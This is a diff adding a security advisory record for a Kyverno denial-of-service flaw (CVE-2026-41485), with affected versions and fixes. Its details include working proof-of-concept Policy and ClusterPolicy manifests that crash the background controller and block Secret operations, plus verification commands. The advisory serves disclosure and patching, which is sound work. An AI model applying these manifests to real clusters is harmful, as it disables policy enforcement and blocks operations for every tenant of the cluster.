@@ -1,0 +1,81 @@
+{
+  "id": "GHSA-fpjq-c37h-cqcv",
+  "modified": "2026-05-05T16:11:08.519451358Z",
+  "published": "2026-04-24T20:40:39Z",
+  "aliases": [
+    "BIT-kyverno-2026-41485",
+    "CVE-2026-41485"
+  ],
+  "summary": "Kyverno Controller Denial of Service via forEach Mutation Panic",
+  "details": "### Summary\n\nAn unchecked type assertion in the `forEach` mutation handler allows any user with permission to create a `Policy` or `ClusterPolicy` to crash the cluster-wide background controller into a persistent CrashLoopBackOff. The same bug also causes the admission controller to drop connections and block all matching resource operations. The crash loop persists until the policy is deleted. The vulnerability is confined to the legacy engine, and CEL-based policies are unaffected.\n\n### Details\n\nIn `pkg/engine/mutate/mutation.go`, the `ForEach` function performs a bare type assertion on a map value that can be nil:\n\n```go\npatcher := NewPatcher(fe[\"patchStrategicMerge\"], fe[\"patchesJson6902\"].(string))\n```\n\nWhen a `forEach` rule uses a `patchesJson6902` field containing a variable substitution (e.g., `{{ element.nonexistent }}`) that resolves to `nil` at runtime, the type assertion `.(string)` on a nil `interface{}` triggers an unrecoverable Go panic:\n\n```\npanic: interface conversion: interface {} is nil, not string\n```\n\nWhen a `mutateExisting` rule triggers, the admission controller creates an `UpdateRequest` resource that the background controller processes asynchronously. This resource survives controller restarts, re-triggering the panic on every restart until the policy or `UpdateRequest` is deleted.\n\nThe background controller processes `mutateExisting` rules in worker goroutines where `k8s.io/apimachinery/pkg/util/runtime.HandleCrash` catches panics but re-panics by default, killing the process. The admission controller survives because Go's `net/http` server absorbs panics in handler goroutines via  `defer recover()`, though the connection is dropped.\n\nThe vulnerable code was introduced in #10702. Kyverno versions v1.13.0 to v1.17.1 are affected.\n\n### PoC\n\nApply the following manifest:\n\n```yaml\n# --- PoC A: Namespaced Policy crashes the background controller ---\napiVersion: kyverno.io/v1\nkind: Policy\nmetadata:\n  name: poc-background-crash\n  namespace: default\nspec:\n  mutateExistingOnPolicyUpdate: true\n  rules:\n  - name: crash-foreach-nil\n    match:\n      any:\n      - resources:\n          kinds:\n          - ConfigMap\n    mutate:\n      targets:\n      - apiVersion: v1\n        kind: ConfigMap\n        name: poc-target\n        namespace: default\n      foreach:\n      - list: \"target.data | keys(@)\"\n        patchesJson6902: \"{{ element.nonexistent }}\"\n---\napiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: poc-target\n  namespace: default\ndata:\n  key1: value1\n---\n# This ConfigMap creation triggers the mutateExisting rule via UpdateRequest\napiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: poc-trigger\n  namespace: default\ndata:\n  trigger: \"true\"\n---\n# --- PoC B: ClusterPolicy panics the admission controller (connection drop) ---\n# Effect: all Secret create/update operations are blocked cluster-wide\n# The admission controller does not crash (net/http recovers), but every\n# matching request gets EOF -\u003e webhook failure -\u003e denied\napiVersion: kyverno.io/v1\nkind: ClusterPolicy\nmetadata:\n  name: poc-admission-panic\nspec:\n  rules:\n  - name: panic-foreach-nil\n    match:\n      any:\n      - resources:\n          kinds:\n          - Secret\n    mutate:\n      foreach:\n      - list: \"request.object.data | keys(@)\"\n        patchesJson6902: \"{{ element.nonexistent }}\"\n```\n\nVerify:\n\n```bash\n# After ~5 seconds, background controller is in CrashLoopBackOff:\nkubectl get pods -n kyverno -l app.kubernetes.io/component=background-controller\n\n# Admission panic — all Secret operations fail with EOF:\nkubectl create secret generic test-secret --from-literal=key=value\n# Error: failed calling webhook \"mutate.kyverno.svc-fail\": ... EOF\n```\n\nAdmission controller logs:\n\n```\nhttp: panic serving 10.244.0.1:64359: interface conversion: interface {} is nil, not string\ngoroutine 1914 [running]:\nnet/http.(*conn).serve.func1()\n        net/http/server.go:1943 +0xb4\npanic({0x3947fc0?, 0x40023e3890?})\n        runtime/panic.go:783 +0x120\ngithub.com/kyverno/kyverno/pkg/engine/mutate.ForEach({0x394e240?, 0x0?}, {{0x4001c3f300, 0x1d}, 0x0, {0x0, 0x0, 0x0}, 0x0, 0x0, ...}, ...)\n        github.com/kyverno/kyverno/pkg/engine/mutate/mutation.go:81 +0x3e0\ngithub.com/kyverno/kyverno/pkg/engine/handlers/mutation.(*forEachMutator).mutateElements(0x4002609410, {0x4cd78d8, 0x40023b1d10}, {{0x4001c3f300, 0x1d}, 0x0, {0x0, 0x0, 0x0}, 0x0, ...}, ...)\n        github.com/kyverno/kyverno/pkg/engine/handlers/mutation/common.go:126 +0x4e8\ngithub.com/kyverno/kyverno/pkg/engine/handlers/mutation.(*forEachMutator).mutateForEach(0x4002609410, {0x4cd78d8, 0x40023b1d10})\n...\n```\n\n### Impact\n\nPersistent denial of service of cluster-wide Kyverno controllers. `Policy` is a namespaced resource whose creation can be delegated to namespace users via standard Role/RoleBinding, without granting any cluster-level permissions. Such a user can:\n\n1. Crash the background controller into a persistent CrashLoopBackOff, halting all background processing (generate rules, mutateExisting rules, cleanup) across all namespaces in the cluster, not just their own.\n2. Block admission operations for matched resource kinds within their namespace via the admission controller webhook panic path. With a `ClusterPolicy` (requiring cluster-level RBAC), the admission block extends cluster-wide.\n\nThe crash loop is self-sustaining because the poisoned `UpdateRequest` remains in the queue and re-triggers the panic on every controller restart.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/kyverno/kyverno",
+        "purl": "pkg:golang/github.com/kyverno/kyverno"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "1.13.0"
+            },
+            {
+              "fixed": "1.16.4"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-fpjq-c37h-cqcv/GHSA-fpjq-c37h-cqcv.json"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/kyverno/kyverno",
+        "purl": "pkg:golang/github.com/kyverno/kyverno"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "1.17.0-rc.1"
+            },
+            {
+              "fixed": "1.17.2"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-fpjq-c37h-cqcv/GHSA-fpjq-c37h-cqcv.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/kyverno/kyverno/security/advisories/GHSA-fpjq-c37h-cqcv"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-41485"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/kyverno/kyverno/commit/76c8fdbe87328722e099e1fd44c3f21c9f7809cb"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/kyverno/kyverno/commit/80e728c2283a0c65e5adb02d8a907106e6ebe7e3"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/kyverno/kyverno"
+    }
+  ]
+}
